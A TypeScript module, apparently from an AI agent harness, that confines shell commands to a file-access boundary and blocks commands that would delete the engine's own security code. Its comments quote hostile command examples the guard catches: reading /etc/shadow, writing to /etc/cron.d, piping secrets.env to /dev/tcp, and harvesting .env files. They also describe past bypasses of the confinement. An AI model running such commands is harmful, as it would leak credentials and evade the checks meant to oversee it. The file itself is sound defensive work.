import { isAbsolute, join } from "node:path";
import { homedir } from "node:os";
import type { SecurityDecision } from "../../types.js";
import { USER_HINTS } from "../../types.js";
import type { FileAccessMode, InlineEvalPolicy } from "./types.js";
import { evaluateFileAccess } from "./file-access.js";
import { evaluateShellCommand } from "./shell-policy.js";
import {
  execBasename, isShellReparseFlag, resolveRealArgv0Index, splitShellSegments, tokenizeCommand,
} from "./shell-lex.js";
import { detectLockedBaselineMutation, detectProtectedEngineMutation } from "./shell-mutation-guard.js";

// ── Best-effort shell file-access confinement (defense in depth) ──
//
// The dedicated file tools (read/write/edit, spreadsheet, document, …) are
// confined to the file-access mode by routing every caller path through
// evaluateFileAccess. bash is the hole: it can `cat`/`type`/redirect to any file
// the OS user can reach, regardless of the mode. The SOUND fix is OS-level process
// confinement (Linux Landlock/bubblewrap, macOS sandbox-exec) so the kernel — not
// a parser — limits what bash sees; that is the planned POSIX hard-wall. Windows
// has no cheap native jail, so this guard makes bash OBEY THE MODE there today.
//
// It is explicitly BEST-EFFORT, not a hard wall: it reads the command string,
// extracts path-shaped tokens via the canonical quote-aware lexer (shell-lex), and
// asks the SAME evaluateFileAccess gate the file tools use whether each is inside
// the approved roots. It rejects the realistic escapes: an absolute or ~-expanded
// path, a `..` climb, a redirect target outside the boundary — including one GLUED
// to the command word (`cat</etc/shadow`) or hidden inside a re-parsed `bash -c "…"`
// body, which it finds through the SAME argv[0] resolution the egress scans use
// (shell-lex resolveRealArgv0Index) so a command-modifier wrapper — `env bash -c`,
// `timeout 5 sh -c`, `xargs -I{} sh -c`, stacked — cannot shift the shell out of
// argv[0] and leave the body opaque. It CANNOT see a runtime-only path (`$VAR`,
// `$(...)`): when the spawn is UNCONFINED, shell-policy blocks command substitution,
// chaining, and `${}`, so those are mostly closed upstream; under a CONFINED backend
// those rules stand down and the kernel cage is the wall. File tools = the real wall.
//
// Single source of truth: the per-path decision is evaluateFileAccess — the
// exact gate the file tools use — so the mode means the same thing everywhere.

export interface ShellPathGuardCtx {
  workspace: string;
  fileAccessMode: FileAccessMode;
  // Inline-eval (R4-11/R4-13) policy — independent of fileAccessMode. Optional
  // so callers that omit it fail SAFE: an unset policy refuses inline-eval.
  inlineEvalPolicy?: InlineEvalPolicy;
  // EFFECTIVE OS-level confinement of the spawn being vetted — callers derive it
  // from getSandboxStatus().confined (false when a guarded selection FELL BACK to
  // host). Gates ONLY evaluateShellCommand's structural string heuristics
  // (substitution/separators/pipe-cap/script-write/interpreter-escape/inline-eval
  // -form); egress, rm, denylist, and file-access rules ignore it. Optional so
  // callers that omit it fail SAFE (treated as unconfined → every rule applies).
  sandboxConfined?: boolean;
  allowedPathCheck: (realPath: string, sessionId?: string) => boolean;
  sessionId?: string;
}

// Device sinks that are always fine as a target, both platforms — a redirect to
// /dev/null must not read as "escaping the workspace".
export const BENIGN_PATHS = new Set([
  "/dev/null", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/tty",
  "nul", "con", "/dev/fd/1", "/dev/fd/2",
]);

// Commands whose ARGUMENTS use the DOS `/SWITCH` form. On win32 isAbsolute("/Y")
// is TRUE, so without this shield a bare switch reads as a root-anchored path and
// false-BLOCKS an ordinary in-workspace command. Every verb here is switch-ONLY in
// the shapes we care about: a lone `/X` operand is never a path anyone means.
//
// DO NOT add a verb that takes a PATH operand — `copy`, `del`, `dir`, `erase`,
// `move`, `rd`, `rmdir`, `start`, `timeout`. They were added once (2026-07-27) to
// stop `cmd /c "copy /Y a.txt b.txt"` false-blocking, and it opened a real hole:
// this box ships git-bash, so those names ALSO resolve to coreutils, where the
// operand is a genuine path. `dir /c` then listed the entire C: drive and
// `rmdir /tmp` sailed past (neither is in MUTATOR_ALL_OPERANDS, so nothing
// downstream catches them). One `/segment` is the whole disclosure surface —
// `/etc`, `/root`, `/home`, `/c` are all one segment. `cmd /c "copy /Y …"` stays
// false-blocked; that is a PRE-EXISTING limitation (it false-blocks at top level
// too, with or without this shield) and the safe direction to be wrong in.
// `find` is NOT here for the same reason: git-bash's coreutils `find` takes a path
// operand, and `find /c -name '*.env' -exec cat {} +` reads the whole drive. That
// costs us `find /V "x" file` (the DOS spelling), which now false-blocks — the same
// trade, in the same safe direction, as the nine above.
const WINDOWS_SLASH_SWITCH_COMMANDS = new Set([
  "attrib", "cmd", "findstr", "icacls", "reg", "robocopy", "taskkill", "tasklist", "where", "xcopy",
]);

// There is deliberately NO second table shielding those verbs inside a re-parsed
// `cmd /c` body. That was tried (2026-07-27) to restore `cmd /c "del /q out.txt"`,
// which HEAD allowed and the re-parse regressed. It rested on "inside a cmd body
// every `/X` is a switch" — and cmd.exe MOVE breaks it: `move /Zqx z` performs a
// path lookup rather than a switch parse, so `cmd /c "move /Users x"` reached
// C:\Users. A rule whose safety depends on per-builtin cmd.exe parsing quirks
// cannot be reviewed or kept true, and it buys little here: the agent shell
// resolves to Git Bash first, where MSYS mangles `cmd /c` and the body never runs
// at all. The cost of leaving it out is a FALSE BLOCK on `cmd /c "<dos verb>
// /SWITCH"` — the safe direction, and pinned in the tokenizer suite.

// A shell's re-parsed `-c`/`/c` body is ONE opaque token no path test sees into,
// and nothing upstream looks inside either: shell-rules' INTERP_EVAL_FLAGS
// deliberately EXCLUDES these shells (`-c` is their normal form, not an eval
// escape) and detectInterpreterEscape covers only perl/ruby/php. So
// extractPathTokens re-lexes the body itself (isShellReparseFlag, shell-lex),
// nesting this deep — `bash -c "sh -c '…'"` is one keystroke from the base escape
// — and stopping there so the walk stays bounded.
const MAX_REPARSE_DEPTH = 2;

interface PathToken {
  path: string;
  action: "read" | "write"; // redirect targets gate as writes; everything else as reads
}

/**
 * Confine a bash command to the file-access mode, best-effort. Returns the first
 * out-of-boundary path as a block, else allows. Unrestricted mode is a no-op
 * (evaluateFileAccess already allows reads anywhere).
 */
export function evaluateShellPaths(command: string, ctx: ShellPathGuardCtx): SecurityDecision {
  if (ctx.fileAccessMode === "unrestricted") {
    return { allowed: true, reason: "Unrestricted mode — shell paths not confined" };
  }
  for (const tok of extractPathTokens(command)) {
    const decision = evaluateFileAccess(
      ctx.workspace, ctx.fileAccessMode, ctx.allowedPathCheck, tok.action, tok.path, ctx.sessionId,
    );
    if (!decision.allowed) {
      return {
        allowed: false,
        reason: `Blocked: shell command touches "${tok.path}" outside the ${ctx.fileAccessMode} file-access boundary. ${decision.reason}`,
        userHint: USER_HINTS.fileSystem,
      };
    }
  }
  return { allowed: true, reason: "Shell paths within file-access boundary" };
}

/**
 * Single two-step gate for ANY bash-spawning path: (1) command-shape vetting
 * (denylist / obfuscation / metachars) via evaluateShellCommand, then (2)
 * file-access confinement via evaluateShellPaths. bash (layer-core) AND the
 * shell-class dispatch (kernel-class-policy → process_start/process_restart) BOTH
 * call this, so they get IDENTICAL confinement — `process_start` no longer skips
 * the boundary bash obeys (round-3 finding C3-3). First failing decision wins.
 */
export function evaluateShellCommandAndPaths(command: string, ctx: ShellPathGuardCtx): SecurityDecision {
  // Thread the inline-eval policy + workspace into the command scan so the
  // R4-11/R4-13 inline-eval interpreter-escape refusal gates on its own policy (NOT
  // the file-access mode) and resolves the rename-escape path against the workspace
  // tree. Unset policy → "refuse" (fail safe). This is the canonical seam; the
  // redundant secondary scan in process-session runs AFTER it. ctx.sandboxConfined
  // rides through so the structural heuristics stand down under a confined backend.
  const cmdDecision = evaluateShellCommand(command, ctx.inlineEvalPolicy ?? "refuse", ctx.workspace, ctx.fileAccessMode, undefined, ctx.sandboxConfined);
  if (!cmdDecision.allowed) return cmdDecision;
  // ALWAYS-ON (mode-independent) self-brick guard: refuse a shell command that
  // would DELETE or OVERWRITE the platform's own protected engine source. The
  // write/edit/delete_file tools are already gated by protected-files
  // (resolve-tool.ts), but bash was NOT — so `rm -rf <repo>/src/security` bricked
  // the engine even in unrestricted mode. Same authority (isProtectedFile).
  const engine = detectProtectedEngineMutation(command);
  if (engine) return { allowed: false, reason: engine, userHint: USER_HINTS.secrets };
  // ALWAYS-ON (mode-independent) scaffold-baseline lock: the write/edit tools
  // reject clobbering a harness-generated app skeleton (write-guard.ts), but bash
  // could redirect/cp/mv/rm over the same file. Same manifest is the authority.
  const baseline = detectLockedBaselineMutation(command, ctx.workspace);
  if (baseline) return { allowed: false, reason: baseline, userHint: USER_HINTS.commandShell };
  return evaluateShellPaths(command, ctx);
}

// Pull the file-path-shaped arguments out of a command, via the canonical shell-lex
// primitives: splitShellSegments (quote-aware split on | ; && || & newline — a glued
// separator like `/dev/null;` can no longer contaminate a token), tokenizeCommand (a
// quoted span is ONE quote-stripped token, so a quoted path with spaces arrives
// intact) and resolveRealArgv0Index (the shell behind a wrapper). Conservative by
// intent: pure flags and non-path tokens are skipped, and so is each segment's
// command position — but ONLY when it holds no redirect operator, because that same
// segment split puts a glued `cat</etc/shadow` in command position, where a blanket
// skip hid it from the glued handling below. Plain relative paths are kept
// implicitly: they resolve under the project root, which evaluateFileAccess allows.
// Only tokens that could land OUTSIDE the boundary are emitted; `depth` bounds the
// nested re-lex (start at 0).
function extractPathTokens(command: string, depth = 0): PathToken[] {
  const out: PathToken[] = [];
  for (const segment of splitShellSegments(command)) {
    const words = tokenizeCommand(segment);
    if (!words.length) continue;
    // TWO verbs, deliberately: the DOS-switch shield keys on the LITERAL head
    // (`timeout /t 5` is the DOS builtin, not the POSIX wrapper of that name), while
    // the re-parse keys on the RESOLVED argv[0] — any command-modifier wrapper
    // (`env`/`timeout`/`nice`/`xargs`/`nohup`/`stdbuf`/…, stackable) shifts the shell
    // off index 0 and would otherwise leave its `-c` body opaque.
    const headVerb = execBasename(words[0]);
    const argv0Index = resolveRealArgv0Index(words) ?? 0;
    const shellVerb = execBasename(words[argv0Index]);
    for (let i = 0; i < words.length; i++) {
      let raw = words[i];
      if (!raw) continue;
      // Command position: argv[0] is a binary name/path that legitimately lives
      // outside the workspace, so it is exempt — UNLESS a redirect operator is
      // glued to it (`cat</etc/shadow`, `date>/etc/cron.d/pwn`), which the glued/
      // leading handling below then splits apart.
      if (i === 0 && !/[<>]/.test(raw)) continue;
      // `bash -c "cat /etc/shadow"`: the VALUE is a whole re-parsed command in one
      // token that no path test can see into — re-lex it. Only AFTER the resolved
      // argv[0], so a wrapper's own like-named flag (`ionice -c 2 bash -c "…"`)
      // can't be mis-consumed as the shell's body.
      if (i > argv0Index && isShellReparseFlag(shellVerb, raw) && i + 1 < words.length) {
        const body = words[++i];
        if (depth < MAX_REPARSE_DEPTH) out.push(...extractPathTokens(body, depth + 1));
        continue;
      }
      if (process.platform === "win32" && WINDOWS_SLASH_SWITCH_COMMANDS.has(headVerb)
        && /^\/[A-Za-z?][A-Za-z0-9?-]*(?::[^\\/]*)?$/.test(raw)) continue;

      // A redirect glued to / before a path (>f >>f 2>f <f) marks its target. The
      // operator can also sit MID-token when source and sink are glued
      // (`secrets.env>/dev/tcp/h/443`) — tokenizeCommand keeps that as ONE token, so
      // the leading-anchored match below would miss it and the network sink would
      // escape (R4-15). Detect an interior `>`/`>>`/`<` (optional fd number), emit
      // the LEFT as a read (the source), gate the RIGHT as the target. The left is
      // NOT emitted in command position — there it is argv[0], exempt.
      let action: "read" | "write" = "read";
      const glued = raw.match(/^(.+?)(\d*)(>>|>|<)(.*)$/);
      if (glued && glued[1]) {
        const leftRaw = glued[1];
        if (i > 0 && !BENIGN_PATHS.has(leftRaw.toLowerCase()) && looksLikePath(leftRaw)) {
          out.push({ path: leftRaw, action: "read" });
        }
        action = glued[3] === "<" ? "read" : "write";
        raw = glued[4];
        if (!raw && i + 1 < words.length) raw = words[++i]; // `name> sink`
        if (!raw) continue;
      } else {
        const redir = raw.match(/^(\d*)(>>|>|<)(.*)$/);
        if (redir) {
          action = redir[2] === "<" ? "read" : "write";
          raw = redir[3];
          // Bare ">" with the path as the NEXT word: that word is the target.
          if (!raw && i + 1 < words.length) raw = words[++i];
        }
      }

      // `--flag=/path` / `-o=/path` → keep the value side.
      if (raw.startsWith("-")) {
        const eq = raw.indexOf("=");
        if (eq === -1) continue; // a plain flag, not a path
        raw = raw.slice(eq + 1);
      }

      // Tokens arrive quote-stripped: a quoted path with spaces is ONE intact
      // token (in-boundary no longer fragments; escapes are seen whole).
      if (!raw) continue;
      if (BENIGN_PATHS.has(raw.toLowerCase())) continue;

      // Expand a leading ~ exactly as bash will, so the gate sees the real target
      // (~/secret → <home>/secret), not a project-relative-looking "~/secret".
      if (raw === "~") raw = homedir();
      else if (raw.startsWith("~/") || raw.startsWith("~\\")) raw = join(homedir(), raw.slice(2));

      if (looksLikePath(raw)) out.push({ path: raw, action });
    }
  }
  return out;
}

// Is this token shaped like a path that could escape the workspace? Absolute
// paths (POSIX /…, Windows C:\…, UNC \\…), and any token with a `..` segment.
// Plain relative tokens (`foo.txt`, `src/bar`) are intentionally NOT flagged:
// they resolve inside the project, which the mode already permits.
function looksLikePath(t: string): boolean {
  if (isAbsolute(t)) return true;              // /etc/passwd, \\server\share, C:\… on win32
  if (/^[A-Za-z]:[\\/]/.test(t)) return true;  // C:\ or C:/ — cross-platform recognition
  if (/(^|[\\/])\.\.([\\/]|$)/.test(t)) return true; // a `..` path segment
  return false;
}
